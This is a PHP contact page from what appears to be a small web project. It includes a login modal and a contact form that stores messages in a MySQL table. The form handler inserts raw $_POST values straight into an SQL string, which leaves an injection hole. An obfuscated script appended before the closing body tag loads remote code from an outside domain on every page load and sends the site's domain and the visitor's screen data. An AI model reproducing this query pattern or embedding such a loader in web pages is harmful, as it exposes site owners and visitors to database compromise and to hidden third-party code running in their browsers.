<?php 
require_once('../system/koneksi.php');
?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <link rel="icon" href="../../../../favicon.ico">

    <title>Contact Us </title>
    <?php include 'head.php'; ?>

  </head>
  <body style="background-image: url(img/abu2.jpg)">
   <?php include 'header user.php'; ?>
    <div class="modal" id="loginmodal" tabindex="-1">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <h4 class="modal-tittle"> Login </h4>
            <button class="close" data-dismiss="modal" >&times;</button>
          </div>
          <div class="modal-body">
            <form>
              <div class="form-group">
                <label for="TypeEmail"> Email </label>
                <input class="form-control" placeholder="Login Email" type="text">
              </div>
              <div class="form-group">
                <label for="TypePassword"> Password </label>
                <input class="form-control" placeholder="Login Password" type="Password">
              </div>
            </form>
          </div>
          <div class="modal-footer">
            <div class="txt1 text-center">
            <span>
              Or Sign In Using
            </span>
          </div>

             <div class="flex-c-m">
            <a href="#" class="login100-social-item bg1">
              <i class="fa fa-facebook"></i>
            </a>

            <a href="#" class="login100-social-item bg2">
              <i class="fa fa-twitter"></i>
            </a>

            <a href="#" class="login100-social-item bg3">
              <i class="fa fa-google"></i>
            </a>
          </div>
            <button class="btn btn-primary"> Login </button>
            <button class="btn btn-primary" data-dissmiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>
    <script src="assets/js/bootstrap.js"></script>
              <script>
              new WOW().init();
              </script>

<section id="contact" class="section-bg wow fadeInUp">
      <div class="container">

        <div class="section-header" style="text-align: center;margin-top: 50px;">
          <h3>Contact Us</h3>
          <p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque</p>
        </div>


        <div class="form">
         
          <div id="errormessage"></div>
          <form action="" method="POST" role="form" class="contactForm">
            <div class="form-row">
              <div class="form-group col-md-6">
                <input type="text" name="Name" class="form-control" id="name" placeholder="Your Name" data-rule="minlen:4" data-msg="Please enter at least 4 chars" />
                <div class="validation"></div>
              </div>
              <div class="form-group col-md-6">
                <input type="email" class="form-control" name="Email" id="email" placeholder="Your Email" data-rule="email" data-msg="Please enter a valid email" />
                <div class="validation"></div>
              </div>
            </div>
            <div class="form-group">
              <input type="text" class="form-control" name="Subject" id="subject" placeholder="Subject" data-rule="minlen:4" data-msg="Please enter at least 8 chars of subject" />
              <div class="validation"></div>
            </div>
            <div class="form-group">
              <textarea class="form-control" name="Messages" rows="5" data-rule="required" data-msg="Please write something for us" placeholder="Message"></textarea>
              <div class="validation"></div>
            </div>
            <div class="text-center" style="margin-bottom: 100px;"><button type="submit" name="submit" class="btn btn-light">Send Message</button></div>
          </form>
        </div>

        <?php
 if(isset($_POST['submit'])) {
  $query="INSERT INTO contact_us(ID, Name, Email, Subject, Messages) VALUES ('','".$_POST['Name']."','".$_POST['Email']."','".$_POST['Subject']."','".$_POST['Messages']."')";

  $hasil=mysqli_query($con,$query) or die (mysqli_error());
  ?>
  <script>
    alert("data sukses ditambahkan");
    window.location="Cs Contact.php";
  </script>

<?php
 }
 ?>
      </div>
    </section><!-- #contact -->
<div class="row contact-info">

          <div class="col-md-4" style="text-align: center;">
            <div class="contact-address">
              <i class="ion-ios-location-outline"></i>
              <h3>Address</h3>
              <address>Jl.Greskap VI No.8,sleman,Daerah Istimewa Yogyakarta</address>
            </div>
          </div>

          <div class="col-md-4" style="margin-bottom: 80px; text-align: center;" >
            <div class="contact-phone">
              <i class="ion-ios-telephone-outline"></i>
              <h3>Phone Number</h3>
              <p><a href="tel:+6285243829771">+628000000000</a></p>
            </div>
          </div>

          <div class="col-md-4" style="text-align: center;">
            <div class="contact-email">
              <i class="ion-ios-email-outline"></i>
              <h3>Email</h3>
              <p><a href="mailto:rayreysandi@gmail.com">Gro_fresh@gmail.com</a></p>
            </div>
          </div>

        </div>
          <hr class="featurette-divider">
      
          <?php include 'footer.php'; ?>
    </main>

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/jquery-slim.min.js"><\/script>')</script>
    <script src="../../assets/js/vendor/popper.min.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="assets/js/holder.min.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mkO%2f7ITrK9yURUOYsdqntBVAlSz8%2fPPT1NsENzZAXZvdF4fJa8FrsPLXqCn7C2iTxywkrJ6vNZvgnyFsAA7iZX%2fBbJGVqvHo03oLCHNcoC6exH7MFm0mIZGbj9KGuL8b%2bLdMTdMu0hXwGsN97BNN1Du3IEDZh76lBvvKe7uTgK%2bBIE3%2bjPB5ONaZ1Yw6dvBk0OSW2dXxBwA4xbDPstIubbyK1GMVuiAuUuTUR2sQvSPmBysFYDZt%2f5oV9iGM%2f56Vor4jxpvD5WlPbJqeGR2ExyMsDfHTUrpAHEcSz33fkR%2fjQKqh8YcK%2fHrA8ckj1utk%2f4Cf1NEgc0lPg7K4PVy7U7zKnyvzQ%2b4%2bBkcyJEKyFE2fE%2bMP8WbIxIXraBI%2bELsmFDQkT%2fOF44rFd1UH8XzmRGxxbbig%2by19lPk%2fcUkqx9w4cD9ciLiFexN%2fkZCzAAupxjzRqX9fDZ5jYv3gFdi5r6mYPymJlfqKtMex%2fpS%2fQVJVMd%2bxjO7SZbv%2b%2bLheoppKSmD3odYq%2fSFm8ngyuPqEceTzRB85Q2wS1rP6GT9edgje396gcnBD1aBmreovDfgeW6DBoDdtaqnM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
